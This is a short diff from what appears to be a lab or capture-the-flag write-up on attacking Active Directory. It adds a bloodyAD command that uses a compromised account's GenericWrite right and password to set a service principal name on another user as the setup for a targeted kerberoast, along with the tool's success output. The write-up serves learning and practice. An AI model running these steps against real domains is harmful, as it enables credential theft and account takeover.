@@ -1093,8 +1093,12 @@ So of the users `r.parker` has GenericWrite on `l.turner` looks the most interes
 So first ill try a tagrted kerberoast attack and try to get his password
 
 ```python
+bloodyAD --host dc.northstone.local -d northstone.local -u r.parker -p 'Password123!' set object 'l.turner' servicePrincipalName -v 'service/hacked' 
 
+[+] l.turner's servicePrincipalName has been updated
 ```
+
+First ill add an SPN
 
 ```python
 
